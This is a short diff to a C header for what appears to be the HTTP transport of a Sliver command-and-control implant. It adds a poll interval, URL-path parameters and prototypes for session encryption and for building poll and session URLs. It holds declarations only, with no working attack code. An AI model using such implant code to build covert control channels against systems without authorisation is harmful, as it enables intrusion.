@@ -168,6 +168,7 @@ typedef struct _SLIVER_HTTP_CLIENT {
 	DWORD dwNetTimeout;
 	DWORD dwTlsTimeout;
 	DWORD dwPollTimeout;
+	DWORD dwPollInterval;
 	DWORD dwMaxErrors;
 	LPSTR lpServerMinisignPublicKey;
 	BOOL IsClosed;
@@ -208,6 +209,7 @@ HINTERNET SendRequest
 (
 	_In_ PHTTP_CLIENT This,
 	_In_ PHTTP_REQUEST pRequest,
+	_In_ LPWSTR lpPath,
 	_In_ DWORD dwNumberOfAttemps
 );
 
@@ -247,6 +249,7 @@ PHTTP_RESP SendHttpRequest
 (
 	_In_ PHTTP_CONFIG pHttpConfig,
 	_In_ PHTTP_CLIENT pHttpClient,
+	_In_ LPWSTR lpPath,
 	_In_ HttpMethod Method,
 	_In_ LPSTR lpContentType,
 	_In_ LPSTR lpData,
@@ -275,6 +278,14 @@ LPSTR SliverBase64Encode
 PMINISIGN_PUB_KEY DecodeMinisignPublicKey
 (
 	_In_ LPSTR lpInput
+);
+
+PBYTE SessionEncrypt
+(
+	_In_ PSLIVER_HTTP_CLIENT pClient,
+	_In_ PBYTE pMessage,
+	_In_ DWORD cbMessage,
+	_Out_ PDWORD pcbCipherText
 );
 
 PBYTE SessionDecrypt
@@ -325,4 +336,14 @@ LPSTR ParseSegmentsUrl
 (
 	_In_ PSLIVER_HTTP_CLIENT pClient,
 	_In_ SegmentType SegmentType
+);
+
+LPSTR CreatePollURL
+(
+	_In_ PSLIVER_HTTP_CLIENT pClient
+);
+
+LPSTR CreateSessionURL
+(
+	_In_ PSLIVER_HTTP_CLIENT pClient
 );
